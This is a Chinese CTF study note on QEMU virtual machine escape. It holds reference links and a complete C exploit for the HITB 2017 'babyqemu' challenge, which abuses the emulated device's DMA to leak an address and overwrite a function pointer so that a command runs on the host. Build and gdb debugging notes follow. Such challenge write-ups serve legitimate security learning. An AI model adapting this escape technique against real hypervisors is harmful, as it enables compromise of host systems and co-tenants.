---
title: QEMU 逃逸 潦草笔记
categories:
- CTF/Pwn
tags: 
---

> 更新中...

## 相关原理

- [qemu pwn-基础知识](https://xz.aliyun.com/t/6562)
- [从0到1的虚拟机逃逸三部曲](https://xz.aliyun.com/t/7345)
- [qemu逃逸学习](https://www.anquanke.com/post/id/235191)
- [QEMU逃逸初探（一）](https://www.anquanke.com/post/id/254906)
- [VM escape 之 QEMU Case Study](https://www.giantbranch.cn/2019/07/17/VM%20escape%20%E4%B9%8B%20QEMU%20Case%20Study/)
- [VM escape-QEMU Case Study](https://cool-y.github.io/2021/04/10/vm-escape1/)

主要是打实现在qemu进程中的PCI设备：

- [深入PCI与PCIe之一：硬件篇](https://zhuanlan.zhihu.com/p/26172972)
- [深入PCI与PCIe之二：软件篇](https://zhuanlan.zhihu.com/p/26244141)

- [PCI介绍](http://tianyu-code.top/Linux%E5%86%85%E6%A0%B8/PCI%E4%BB%8B%E7%BB%8D/)
- [x86 CPU地址空间分配](http://tianyu-code.top/Linux%E5%86%85%E6%A0%B8/x86CPU%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E5%88%86%E9%85%8D/)
- [PCIe设备发现过程](https://blog.csdn.net/yhb1047818384/article/details/71076371)


x86的低速外设应该由南桥来管理，不过随着时代的发展相关技术架构也在变化：

- [现在主板上没有南桥北桥芯片组了？](https://zhuanlan.zhihu.com/p/461982828)
- [主板上的南桥和北桥是什么意思？](https://zhuanlan.zhihu.com/p/375804757)
- [主板上的南北桥是什么东西？](https://www.zhihu.com/question/66881178)
- [为什么不把南桥集成进CPU？CPU和南桥芯片中什么资源最珍贵？](https://zhuanlan.zhihu.com/p/47479121)

x86 CPU访问io端口的编号部分是定死的，应该是是现在CPU上，可以通过查看CPU的datasheet确定一些编号：

- [Is there a specification of x86 I/O port assignment?](https://stackoverflow.com/questions/14194798/is-there-a-specification-of-x86-i-o-port-assignment)
- [如何找到英特尔芯片组/CPU的数据手册（datasheet）？](https://zhuanlan.zhihu.com/p/138657102)
- [Technical Resources: Intel® Core™ Processors](https://www.intel.com/content/www/us/en/products/docs/processors/core/core-technical-resources.html)

例如A20地址线的0x92端口，其实已经废弃了：

- [A20 line](https://en.wikipedia.org/wiki/A20_line)
- [关于A20](https://blog.csdn.net/longintchar/article/details/79365928)

有关于地址转换：

- [VM escape 之 QEMU Case Study](https://www.giantbranch.cn/2019/07/17/VM%20escape%20%E4%B9%8B%20QEMU%20Case%20Study/)
- [用户态进程如何得到虚拟地址对应的物理地址？](https://cloud.tencent.com/developer/article/1722573)
- [Linux kernel 笔记 （48）——CONFIG_STRICT_DEVMEM和/dev/crash](https://nanxiao.me/linux-kernel-note-48-config_strict_devmem-and-dev-crash/)
- [pagemap: report swap location for shared pages](https://lore.kernel.org/linux-fsdevel/YO8a4FpvBVEIBgjK@t490s/T/)

有关于qemu内存：

- [Qemu 虚拟机内存初始化源码分析](https://www.anquanke.com/post/id/224571)

## HITB GSEC2017 babyqemu

- [QEMU Escape学习笔记](https://www.anquanke.com/post/id/224199)
- [qemu pwn-hitb gesc 2017 babyqemu writeup](https://ray-cp.github.io/archivers/qemu-pwn-hitb-gesc-2017-babyqemu-writeup)

自己写了一遍exp，为了便于理解对一些代码做出了简化调整：

- 简化了地址转换
- 全局变量只留一个mmio的交互地址
- mmio交互使用/dev/mem直接映射物理地址

```c
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>

void * mmio;

void mmio_write(uint32_t addr, uint32_t value){
    *(uint32_t *)(mmio + addr) = value;
}

uint64_t gva2gpa(void * addr){
    uint64_t page;
    int fd = open("/proc/self/pagemap",0);
    lseek(fd,((uint64_t)addr >> 12 << 3),0);
    read(fd,&page,8);
    return ((page & 0x7fffffffffffff) << 12 ) | ((uint64_t)addr & 0xfff);
}

void set_dma_cpy(uint32_t dst, uint32_t src, uint32_t len){
    mmio_write(0x88,dst);
    mmio_write(0x80,src);
    mmio_write(0x90,len);
}

void copy_to_dma(uint32_t dma,void * src, uint32_t len){
    set_dma_cpy(dma+0x40000,gva2gpa(src),len);
    mmio_write(0x98,1);sleep(1);
}

void copy_from_dma(void * dst,uint32_t dma, uint32_t len){
    set_dma_cpy(gva2gpa(dst),dma+0x40000,len);
    mmio_write(0x98,1|2);sleep(1);
}

void dma_enc(uint32_t dma, uint32_t len){
    set_dma_cpy(0,dma+0x40000,len);
    mmio_write(0x98,1|2|4);
}

int main(){
    uint64_t leak_enc,system_plt;
    mmio = mmap(0,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED, open("/dev/mem",2),0xfea00000);
    copy_from_dma(&leak_enc,0x1000,8);
    system_plt  = leak_enc  - 0x283DD0 + 0x1FDB18;
    
    char * cmd = "gnome-calculator;";
    copy_to_dma(0x200,cmd,strlen(cmd));
    copy_to_dma(0x1000,&system_plt,8);
    dma_enc(0x200,0);
}
```

```
➜  gcc exp.c -static -o exp
➜  find . | cpio -H newc -o > ../../rootfs.cpio
```

### 交互


```c
void * mmio    = mmap(0,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED, open("/dev/mem",2),0xfea00000);

/*
# cat /sys/devices/pci0000\:00/0000\:00\:04.0/resource
0x00000000fea00000 0x00000000feafffff 0x0000000000040200
# cat /sys/devices/pci0000\:00/0000\:00\:04.0/config | hexdump -C
00000000  34 12 33 23 03 01 10 00  10 00 ff 00 00 00 00 00  |4.3#............|
00000010  00 00 a0 fe 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*/
```

```c
int    mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
void * mmio    = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
```

### 调试

```c
➜  cat gdb.cmd 
set args \
-initrd ./rootfs.cpio \
-kernel ./vmlinuz-4.8.0-52-generic \
-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
-monitor /dev/null \
-m 64M --nographic \
-L pc-bios  \
-device hitb,id=vda
➜  gdb ./qemu-system-x86_64 -x gdb.cmd
```

```c
pwndbg> info types HitbState
All types matching regular expression "HitbState":

File /mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/hw/misc/hitb.c:
typedef struct {
    PCIDevice pdev;
    MemoryRegion mmio;
    QemuThread thread;
    QemuMutex thr_mutex;
    QemuCond thr_cond;
    _Bool stopping;
    uint32_t addr4;
    uint32_t fact;
    uint32_t status;
    uint32_t irq_status;
    struct dma_state dma;
    QEMUTimer dma_timer;
    char dma_buf[4096];
    void (*enc)(char *, unsigned int);
    uint64_t dma_mask;
} HitbState;
```

```c
pwndbg> p *((struct HitbState *)(0x555558757fe0))
No struct type named HitbState.
```

```c
pwndbg> p *((HitbState *)(0x555558757fe0))
```

```c
pwndbg> set $a = *((HitbState *)(0x555558757fe0))
pwndbg> p /x $a.dma 
$20 = {
  src = 0x41000, 
  dst = 0x20ed478, 
  cnt = 0x8, 
  cmd = 0x3
}
```

### 逆向